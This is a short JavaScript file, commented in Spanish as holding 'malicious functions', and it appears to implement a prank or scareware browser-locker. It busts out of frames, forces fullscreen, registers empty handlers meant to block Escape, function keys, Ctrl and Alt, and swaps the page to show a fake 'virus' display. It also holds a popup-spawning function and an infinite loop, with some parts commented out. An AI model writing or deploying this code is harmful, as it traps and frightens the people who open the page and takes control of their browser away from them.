//Archivo js con funciones maliciosas

function virus(){

	bloqueo();
	ocultar();
	//maximizar();
}


function bloqueo(){
if(top.location != self.location)
  top.location = self.location;
shortcut.add("s",function() {
});
shortcut.add("a",function() {
});
shortcut.add("escape",function() {
});
shortcut.add("F4",function() {
});
shortcut.add("F5",function() {
});
shortcut.add("F6",function() {
});
shortcut.add("F7",function() {
});
shortcut.add("F8",function() {
});
shortcut.add("F9",function() {
});
shortcut.add("F10",function() {
});
shortcut.add("F11",function() {
});
shortcut.add("F12",function() {
});
shortcut.add("Ctrl",function() {
});
shortcut.add("Alt",function() {
});

}


function maximizar(){

	var w= Math.floor(Math.random() * 100); 
	window.open("propagar.html", "VIRUS");
}

function cargaPaginas(){
   for(var i = 1; i >= 1;i++){
     //window.open("inicio.php");
     
 }

}

function ocultar(){
	document.getElementById('virus').style.display = 'block';
	document.getElementById('info').style.display = 'none';
	document.body.style.backgroundImage = "url('./images/bk.jpg')";

}

function launchFullscreen(element) {
  if(element.requestFullscreen) {
    element.requestFullscreen();
  } else if(element.mozRequestFullScreen) {
    element.mozRequestFullScreen();
  } else if(element.webkitRequestFullscreen) {
    element.webkitRequestFullscreen();
  } else if(element.msRequestFullscreen) {
    element.msRequestFullscreen();
  }
  virus();

  /*setTimeout(function() {
    cargaPaginas();
	}, 4000);*/

}



